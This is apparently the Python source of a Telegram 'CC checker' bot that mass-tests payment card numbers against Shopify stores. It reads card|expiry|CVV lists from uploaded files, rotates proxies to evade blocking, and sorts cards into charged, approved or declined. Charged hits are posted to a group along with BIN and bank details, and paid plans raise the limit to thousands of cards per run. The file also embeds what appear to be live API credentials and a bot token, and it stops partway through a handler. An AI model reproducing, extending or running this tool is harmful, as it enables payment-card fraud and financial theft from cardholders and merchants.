from urllib.parse import urlparse, quote
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml
import random, datetime, os, re, asyncio, time, string, aiofiles, aiohttp, json, uuid, warnings, signal, atexit, hashlib, secrets, base64
from html import unescape
from contextlib import asynccontextmanager

from database import (
    init_db, close_db, ensure_user, get_user_plan, set_user_plan, is_banned_user,
    ban_user, unban_user, create_key, use_key, get_all_keys, delete_key,
    add_proxy_db, get_random_proxy, get_all_user_proxies, get_proxy_count,
    remove_proxy_by_index, clear_all_proxies, add_site_db, get_user_sites,
    remove_site_db, save_card_to_db, get_total_users, get_premium_count,
    get_total_sites_count, get_total_cards_count, get_approved_count
)

warnings.filterwarnings('ignore')

# ---------- CONFIG ----------
API_ID = 36442788
API_HASH = 'a46cfef94ef9de4026597c6a4addf073'
BOT_TOKEN = '8180020111:AAFnyWXzcet_bW3d03Oq-04bHWa5YDCgNY8'
ADMIN_ID = [6598607558,6456561750]
GROUP_ID = -1003684602999
API_BASE_URL = "https://web-production-a8008.up.railway.app/shopify"

MAX_RETRIES = 3
TASK_TIMEOUT = 30
MAX_CONCURRENT = 100

# ---------- CUSTOM EMOJIS ----------
CE = {
    "crown":  5039727497143387500,
    "bolt":   5042334757040423886,
    "brain":  5040030395416969985,
    "shield": 5042328396193864923,
    "star":   5042176294222037888,
    "gem":    5042050649248760772,
    "check":  5039793437776282663,
    "fire":   5039644681583985437,
    "party":  5039778134807806727,
    "search": 5039649904264217620,
    "chart":  5042290883949495533,
    "pin":    5039600026809009149,
    "joker":  5039998939076494446,
    "plus":   5039891861246838069,
    "cross":  5040042498634810056,
    "info":   5042306247047513767,
    "gift":   5041975203853239332,
    "eyes":   5039623284056917259,
    "trash":  5039614900280754969,
    "tick":   5039844895779455925,
    "stop":   5039671744172917707,
    "warn":   5039665997506675838,
    "link":   5042101437237036298,
    "globe":  5042186567783809934,
}
PE = "⭐"

# ---------- Helper ----------
def random_username():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))

# ---------- HTML + Custom Emoji Helpers ----------
def _utf16_offset(text, py_pos):
    return len(text[:py_pos].encode('utf-16-le')) // 2

def _build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx = 0
        utf16_pos = 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]
                ))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await event.reply(text, formatting_entities=entities, buttons=buttons, file=file)

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await client.send_message(chat_id, text, formatting_entities=entities, buttons=buttons)

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    await msg.edit(text, formatting_entities=entities, buttons=buttons)

def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ---------- GLOBALS ----------
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_RAN_PROCESSES = {}
USER_APPROVED_PREF = {}

# ---------- FIXED SESSION MANAGEMENT ----------
_GLOBAL_SESSION = None
REQUEST_COUNTER = 0
MAX_REQUESTS_PER_SESSION = 500
_SESSION_LOCK = asyncio.Lock()

client = TelegramClient('cc_bot_v2', API_ID, API_HASH)

# ---------- HTTP Session with Auto-Rotation & Force Close ----------
async def get_session():
    global _GLOBAL_SESSION, REQUEST_COUNTER
    async with _SESSION_LOCK:
        REQUEST_COUNTER += 1
        if REQUEST_COUNTER >= MAX_REQUESTS_PER_SESSION or _GLOBAL_SESSION is None or _GLOBAL_SESSION.closed:
            old_session = _GLOBAL_SESSION
            if old_session and not old_session.closed:
                asyncio.create_task(old_session.close())
            
            timeout = aiohttp.ClientTimeout(total=45, connect=10)
            connector = aiohttp.TCPConnector(limit=1000, force_close=False, ssl=False, enable_cleanup_closed=True)
            _GLOBAL_SESSION = aiohttp.ClientSession(timeout=timeout, connector=connector)
            REQUEST_COUNTER = 0
        return _GLOBAL_SESSION

async def _safe_close_session():
    global _GLOBAL_SESSION
    async with _SESSION_LOCK:
        if _GLOBAL_SESSION and not _GLOBAL_SESSION.closed:
            try:
                await asyncio.wait_for(_GLOBAL_SESSION.close(), timeout=3.0)
            except:
                pass
        _GLOBAL_SESSION = None

def _cleanup_global_session():
    global _GLOBAL_SESSION
    if _GLOBAL_SESSION and not _GLOBAL_SESSION.closed:
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                asyncio.create_task(_safe_close_session())
            else:
                loop.run_until_complete(_safe_close_session())
        except Exception:
            pass

atexit.register(_cleanup_global_session)

# ---------- PROXY HELPERS ----------
async def test_proxy(proxy_url, test_url="https://httpbin.org/status/200", timeout=10):
    try:
        session = await get_session()
        async with session.get(test_url, proxy=proxy_url, timeout=timeout) as resp:
            return resp.status == 200, None
    except Exception as e:
        return False, str(e)

async def get_working_proxy(user_id, max_attempts=5):
    return await get_random_proxy(user_id)

# ---------- Helper Functions ----------
def get_cc_limit(plan: str, user_id=None):
    limits = {"free": 1, "pro": 5000, "toji": 10000}
    return limits.get(plan.lower(), 300)

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except:
            return False
        domain = parsed.netloc
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls_from_text(text):
    urls = set()
    for line in text.split('\n'):
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned and is_valid_url_or_domain(cleaned):
            urls.add(cleaned)
    return list(urls)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    host = port = username = password = None
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    else:
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        if match:
            host, port, username, password = match.groups()
        else:
            match = re.match(r'^([^:@]+):(\d+)$', proxy)
            if match:
                host, port = match.groups()
    if not host or not port:
        return None
    port = int(port)
    if port <= 0 or port > 65535:
        return None
    proxy_url = f"{proxy_type}://"
    if username and password:
        proxy_url += f"{username}:{password}@{host}:{port}"
    else:
        proxy_url += f"{host}:{port}"
    return {
        'ip': host,
        'port': str(port),
        'username': username,
        'password': password,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        session = await get_session()
        async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
            if res.status != 200:
                return "Not Found", "-", "-", "-", "-", "???"
            data = await res.json()
            return (data.get('brand','-'), data.get('type','-'), data.get('level','-'),
                    data.get('bank','-'), data.get('country_name','-'), data.get('country_flag','???'))
    except:
        return "-", "-", "-", "-", "-", "???"

SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'tax amount empty', 'del ammount empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty',
    'receipt empty', 'site error! status: 429', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402', 'site requires login',
    'failed to get token', 'no valid products', 'not shopify', 'failed to get checkout',
    'captcha at checkout', 'site not supported for now', 'connection error',
    'error processing card', '504', 'server error', 'client error', 'amount_too_small',
    'amount too small', 'payments_positive_amount_expected', 'change proxy or site',
    'token not found', 'invalid_response', 'could not resolve host', 'connect tunnel failed',
    'failed to tokenize card', 'site error', 'site dead', 'proxy dead',
    'failed to get session token', 'handle is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req', 'cloudflare', 'connection failed',
    'timed out', 'access denied', 'tlsv1 alert', 'ssl routines', 'could not resolve',
    'domain name not found', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error', 'timeout', 'unreachable',
    'ssl error', '502', '503', 'bad gateway', 'service unavailable', 'gateway timeout',
    'network error', 'connection reset', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required', 'url rejected',
    'malformed input', 'captcha_required', 'captcha required', 'site errors',
    'merchandise_not_enough_stock_on_variant', 'GENERIC_ERROR',
]

def is_site_error(response_text):
    if not response_text:
        return True
    return any(kw in response_text.lower() for kw in SITE_ERROR_KEYWORDS)

def classify_api_response(response_json):
    api_response = str(response_json.get('Response', ''))
    api_status = response_json.get('Status', False)
    price = response_json.get('Price', '-')
    gateway = response_json.get('Gate', response_json.get('Gateway', 'Shopify'))
    if price and price != '-':
        price = f"${price}"
    rl = api_response.lower()
    if is_site_error(api_response):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "SiteError"}
    charged = ["order_paid","order_placed","thank you","payment successful","order completed","charged"]
    approved = ["otp_required","3d_authentication","insufficient_funds","cvc","ccn live cvv"]
    if any(k in rl for k in charged):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}
    if any(k in rl for k in approved):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    if api_status and not any(w in rl for w in ["decline","denied","failed","error","rejected"]):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Declined"}

async def call_shopify_api(site, cc, proxy_data=None):
    if not site.startswith(('http://','https://')):
        site = f'https://{site}'
    encoded_site = quote(site, safe='')
    encoded_cc = quote(cc, safe='')
    url = f'{API_BASE_URL}?site={encoded_site}&cc={encoded_cc}'
    if proxy_data:
        proxy_str = f"{proxy_data['ip']}:{proxy_data['port']}"
        if proxy_data.get('username') and proxy_data.get('password'):
            proxy_str = f"{proxy_data['username']}:{proxy_data['password']}@{proxy_str}"
        url += f'&proxy={quote(proxy_str, safe="")}'
    
    try:
        session = await get_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status != 200:
                return None, f"HTTP_{resp.status}"
            try:
                data = await resp.json()
                return data, None
            except:
                return None, "Invalid JSON"
    except asyncio.TimeoutError:
        return None, "Timeout"
    except Exception as e:
        return None, str(e)

async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_working_proxy(user_id) if user_id else None
    try:
        data, err = await call_shopify_api(site, card, proxy_data)
        if err:
            return {"Response": err, "Price": "-", "Gateway": "-", "Status": "SiteError"}
        return classify_api_response(data)
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}

# ==================== RETRY FUNCTIONS WITH 3 ATTEMPTS ON DIFFERENT SITES ====================

async def check_card_with_retry(card, sites, user_id=None, max_retries=3):
    """
    Check card with up to 3 retries using different sites each time
    Returns: (result_dict, site_index_used)
    """
    used_indices = set()
    
    for attempt in range(max_retries):
        # Get available sites not tried yet
        available_indices = [i for i in range(len(sites)) if i not in used_indices]
        
        if not available_indices:
            # No more unique sites to try
            break
        
        site_idx = random.choice(available_indices)
        site = sites[site_idx]
        used_indices.add(site_idx)
        
        try:
            result = await asyncio.wait_for(
                check_card_specific_site(card, site, user_id),
                timeout=TASK_TIMEOUT
            )
            
            # Only retry on site errors
            if result.get("Status") != "SiteError":
                return result, site_idx + 1
                
        except asyncio.TimeoutError:
            result = {"Status": "SiteError", "Response": "Timeout", "Gateway": "-", "Price": "-"}
        except Exception as e:
            result = {"Status": "SiteError", "Response": str(e), "Gateway": "-", "Price": "-"}
        
        # Brief delay before next retry (but not for the last attempt)
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    
    # All retries failed with site errors
    return {"Response": "Max retries (3), all sites returned errors", "Price": "-", "Gateway": "-", "Status": "Error"}, -1

async def check_card_with_retry_random(card, sites, user_id=None, max_retries=3):
    """
    Check card with up to 3 retries using different random sites each time
    Returns: (result_dict, site_info_string or site_index)
    """
    used_indices = set()
    
    for attempt in range(max_retries):
        # Get available indices not tried yet
        available_indices = [i for i in range(len(sites)) if i not in used_indices]
        
        if not available_indices:
            break
        
        site_idx = random.choice(available_indices)
        site = sites[site_idx]
        used_indices.add(site_idx)
        
        try:
            result = await asyncio.wait_for(
                check_card_specific_site(card, site, user_id),
                timeout=TASK_TIMEOUT
            )
            
            # Only retry on site errors
            if result.get("Status") != "SiteError":
                return result, site_idx + 1
                
        except asyncio.TimeoutError:
            result = {"Status": "SiteError", "Response": "Timeout", "Gateway": "-", "Price": "-"}
        except Exception as e:
            result = {"Status": "SiteError", "Response": str(e), "Gateway": "-", "Price": "-"}
        
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    
    return {"Response": "Max retries (3), all random sites returned errors", "Price": "-", "Gateway": "-", "Status": "Error"}, -1

async def cancellable_check(card, site, user_id, timeout=TASK_TIMEOUT):
    """Wrapper that makes any card check cancellable with timeout"""
    try:
        return await asyncio.wait_for(
            check_card_specific_site(card, site, user_id),
            timeout=timeout
        )
    except asyncio.TimeoutError:
        return {"Status": "Declined", "Response": f"Timeout", "Gateway": "-", "Price": "-"}
    except Exception as e:
        return {"Status": "Declined", "Response": str(e), "Gateway": "-", "Price": "-"}

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    proxy_data = await get_working_proxy(user_id) if user_id else None
    try:
        data, err = await call_shopify_api(site, test_card, proxy_data)
        if err or is_site_error(data.get('Response','')):
            return {"status": "dead", "response": err or data.get('Response',''), "site": site, "price": data.get('Price','-') if data else '-'}
        return {"status": "working", "response": data.get('Response',''), "site": site, "price": data.get('Price','-')}
    except:
        return {"status": "dead", "response": "Exception", "site": site, "price": "-"}

def get_status_header(status):
    if status == "Charged":
        return f"{PE} CHARGED {PE}", [CE["gem"], CE["gem"]]
    elif status == "Approved":
        return f"{PE} APPROVED {PE}", [CE["check"], CE["check"]]
    elif status in ("Error","SiteError"):
        return f"{PE} ERROR {PE}", [CE["cross"], CE["cross"]]
    else:
        return f"{PE} DECLINED {PE}", [CE["cross"], CE["cross"]]

async def send_hit_notification(card, result, username, user_id):
    try:
        price = result.get('Price','-')
        response = result.get('Response','-')
        gateway = result.get('Gateway','Shopify')
        hit_msg = f"{PE} CHARGED HIT {PE}\n━━━━━━━━━━━━━━━━━\nResponse ━ {response}\nGateway ━ {gateway}\nPrice ━ {price}\n━━━━━━━━━━━━━━━━━\nUser ━ @{username}"
        await styled_send(GROUP_ID, hit_msg, emoji_ids=[CE["fire"], CE["fire"]])
    except:
        pass

async def handle_hit(event, card, result, status, site_info, username, is_private):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(status)
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {result.get('Gateway','Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {result.get('Response')}
Price ━ {result.get('Price')}
{f"Site ━ {site_info}" if site_info else ""}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        await styled_reply(event, msg, emoji_ids=emojis)
        if status == "Charged":
            if event.is_group:
                try:
                    m = await event.reply("⚡ Charged hit")
                    await m.pin()
                except:
                    pass
            if is_private:
                await send_hit_notification(card, result, username, event.sender_id)
    except:
        pass

# ==================== MASS SHOPIFY CHECK WITH 3 RETRIES ====================

async def process_mtxt_cards(event, cards, local_sites, show_approved=True):
    """
    Mass check cards using user's sites with 3 retries on different sites
    """
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    total = len(cards)
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    is_private = event.chat.id == user_id
    status_msg = await styled_reply(event, f"{PE} Starting mass check (3 retries with different sites)...", emoji_ids=[CE["pin"]])
    BATCH_SIZE = 30
    last_update = 0
    
    def should_update():
        nonlocal last_update
        now = time.time()
        if now - last_update >= 3:
            last_update = now
            return True
        return False
    
    idx = 0
    while idx < total:
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await styled_edit(status_msg, f"{PE} Stopped by user", emoji_ids=[CE["stop"]])
            return
        
        batch = cards[idx:idx+BATCH_SIZE]
        tasks = []
        for card in batch:
            tasks.append(check_card_with_retry(card, local_sites, user_id, max_retries=3))
        
        results = await asyncio.gather(*tasks)
        
        for card, (res, site_idx) in zip(batch, results):
            checked += 1
            status = res.get("Status", "Declined")
            
            if status == "Charged":
                charged += 1
                asyncio.create_task(handle_hit(event, card, res, status, site_idx, username, is_private))
            elif status == "Approved":
                approved += 1
                # Show approved cards but DON'T save to database
                if show_approved:
                    asyncio.create_task(handle_hit(event, card, res, status, site_idx, username, is_private))
            elif status in ("SiteError", "Error"):
                errors += 1
            else:
                declined += 1
        
        if should_update():
            kb = [
                [pbtn(f"{PE} Charged ━ {charged}", "none")],
                [pbtn(f"{PE} Approved ━ {approved}", "none")],
                [pbtn(f"{PE} Declined ━ {declined}", "none")],
                [pbtn(f"{PE} Errors ━ {errors}", "none")],
                [pbtn(f"{PE} {checked}/{total}", "none")],
                [pbtn("🛑 Stop", f"stop_mtxt:{user_id}")]
            ]
            await styled_edit(status_msg, f"{PE} Processing batch {idx//BATCH_SIZE+1}... (3 retries on site errors)", buttons=kb, emoji_ids=[CE["star"]])
        
        idx += BATCH_SIZE
    
    final = f"""{PE} COMPLETED (3 retries on site errors)
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final, emoji_ids=[CE["party"], CE["gem"], CE["check"]])
    ACTIVE_MTXT_PROCESSES.pop(user_id, None)

# ==================== RANDOM SITE MASS CHECK WITH 3 RETRIES ====================

async def process_ran_cards(event, cards, global_sites, show_approved=True):
    """
    Mass check cards using random global sites with 3 retries on different sites
    """
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    total = len(cards)
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    is_private = event.chat.id == user_id
    status_msg = await styled_reply(event, f"{PE} Random site check started (3 retries with different sites)...", emoji_ids=[CE["joker"]])
    BATCH_SIZE = 30
    last_update = 0
    
    def should_update():
        nonlocal last_update
        now = time.time()
        if now - last_update >= 3:
            last_update = now
            return True
        return False
    
    idx = 0
    while idx < total:
        if user_id not in ACTIVE_RAN_PROCESSES:
            await styled_edit(status_msg, f"{PE} Stopped by user", emoji_ids=[CE["stop"]])
            return
        
        batch = cards[idx:idx+BATCH_SIZE]
        tasks = []
        for card in batch:
            tasks.append(check_card_with_retry_random(card, global_sites, user_id, max_retries=3))
        
        results = await asyncio.gather(*tasks)
        
        for card, (res, site_info) in zip(batch, results):
            checked += 1
            status = res.get("Status", "Declined")
            
            if status == "Charged":
                charged += 1
                asyncio.create_task(handle_hit(event, card, res, status, site_info, username, is_private))
            elif status == "Approved":
                approved += 1
                # Show approved cards but DON'T save to database
                if show_approved:
                    asyncio.create_task(handle_hit(event, card, res, status, site_info, username, is_private))
            elif status in ("SiteError", "Error"):
                errors += 1
            else:
                declined += 1
        
        if should_update():
            kb = [
                [pbtn(f"{PE} Charged ━ {charged}", "none")],
                [pbtn(f"{PE} Approved ━ {approved}", "none")],
                [pbtn(f"{PE} Declined ━ {declined}", "none")],
                [pbtn(f"{PE} Errors ━ {errors}", "none")],
                [pbtn(f"{PE} {checked}/{total}", "none")],
                [pbtn("🛑 Stop", f"stop_ran:{user_id}")]
            ]
            await styled_edit(status_msg, f"{PE} Random batch {idx//BATCH_SIZE+1}... (3 retries on site errors)", buttons=kb, emoji_ids=[CE["star"]])
        
        idx += BATCH_SIZE
    
    final = f"""{PE} RANDOM CHECK DONE (3 retries on site errors)
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final, emoji_ids=[CE["party"], CE["gem"], CE["check"], CE["cross"], CE["warn"]])
    ACTIVE_RAN_PROCESSES.pop(user_id, None)


# ==================== BOT COMMANDS ====================

@client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
async def start(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    text = f"""{PE} <b>BEAST SHOPIFY</b>
━━━━━━━━━━━━━━━━━
{PE} <b>Fast. Secure. Premium.</b>
{PE} /sh       - Single CC check
{PE} /mtxt     - Mass CC from .txt file (max {limit}) - 3 retries
{PE} /ran      - Random site mass check - 3 retries
━━━━━━━━━━━━━━━━━
{PE} /add      - Add site(s)
{PE} /rm       - Remove site(s)
{PE} /check    - Test sites
{PE} /info     - Your profile
{PE} /redeem   - Redeem key
{PE} /plan     - Plans
━━━━━━━━━━━━━━━━━
{PE} Proxy (private only)
{PE} /addpxy   - Add proxy
{PE} /proxy    - List proxies
{PE} /chkpxy   - Test proxies
{PE} /rmpxy    - Remove proxy
━━━━━━━━━━━━━━━━━
{PE} <b>Premium perks</b>
{PE} • Private proxy support
{PE} • Priority checkout routing
{PE} • Mass check power up to {limit}
━━━━━━━━━━━━━━━━━
Plan: <b>{plan.upper()}</b> | Limit: {limit} CCs"""
    emojis = [CE["bolt"], CE["search"], CE["chart"], CE["pin"], CE["joker"],
              CE["plus"], CE["cross"], CE["globe"], CE["info"], CE["gift"],
              CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["crown"], CE["info"], CE["joker"], CE["fire"], CE["gift"], CE["gem"], CE["fire"]]
    await styled_reply(event, text, emoji_ids=emojis)

# ==================== SINGLE SHOPIFY COMMAND (/sh) ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    await ensure_user(event.sender_id)
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} No proxies found! Use /addpxy to add proxies first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} No working proxies found! Use /chkpxy to test your proxies.", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: /sh 4111111111111111|12|2025|123", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Add with /add", emoji_ids=[CE["warn"]])
    
    loading = await event.reply("💎")
    try:
        res, site_idx = await check_card_with_retry(card, sites, event.sender_id, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(res.get("Status","Declined"))
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ {res.get('Gateway','Unknown')}
━━━━━━━━━━━━━━━━━
Response ━ {res.get('Response')}
Price ━ {res.get('Price')}
Site ━ {site_idx}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        await loading.delete()
        await styled_reply(event, msg, emoji_ids=emojis)
        if res.get("Status") == "Charged":
            if event.is_group:
                try:
                    m = await event.reply("⚡ Charged hit")
                    await m.pin()
                except:
                    pass
            else:
                sender = await event.get_sender()
                username = sender.username or f"user_{event.sender_id}"
                await send_hit_notification(card, res, username, event.sender_id)
        # ✅ REMOVED: No database saving for approved cards
    except Exception as e:
        await loading.delete()
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])
# ==================== MASS SHOPIFY COMMAND (/mtxt) ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt\b'))
async def mtxt_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to .txt file", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to .txt file", emoji_ids=[CE["warn"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} No proxies found! Use /addpxy to add proxies first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} No working proxies found! Use /chkpxy to test your proxies.", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Add with /add", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path,'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Read error", emoji_ids=[CE["cross"]])
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards", emoji_ids=[CE["cross"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Limiting to {limit} cards", emoji_ids=[CE["warn"]])
    
    kb = [
        [pbtn("✅ Yes (Show Approved)", f"mtxt_pref:yes:{event.sender_id}")],
        [pbtn("❌ No (Hide Approved)", f"mtxt_pref:no:{event.sender_id}")]
    ]
    pref_msg = await styled_reply(event, f"{PE} Show approved cards? (3 retries on site errors)", kb, emoji_ids=[CE["pin"]])
    USER_APPROVED_PREF[f"mtxt_{event.sender_id}"] = {"cards": cards, "sites": sites, "event": event, "pref_msg": pref_msg}


# ==================== RANDOM SITE MASS CHECK COMMAND (/ran) ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran\b'))
async def ran_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} BANNED", emoji_ids=[CE["stop"]])
    if event.sender_id in ACTIVE_RAN_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with /ran", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    if not os.path.exists('sites.txt'):
        return await styled_reply(event, f"{PE} sites.txt missing! Contact admin.", emoji_ids=[CE["cross"]])
    with open('sites.txt','r') as f:
        global_sites = [l.strip() for l in f if l.strip()]
    if not global_sites:
        return await styled_reply(event, f"{PE} No sites in sites.txt", emoji_ids=[CE["cross"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} No proxies found! Use /addpxy to add proxies first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} No working proxies found! Use /chkpxy to test your proxies.", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path,'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards", emoji_ids=[CE["cross"]])
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Limiting to {limit} cards", emoji_ids=[CE["warn"]])
    
    kb = [
        [pbtn("✅ Yes (Show Approved)", f"ran_pref:yes:{event.sender_id}")],
        [pbtn("❌ No (Hide Approved)", f"ran_pref:no:{event.sender_id}")]
    ]
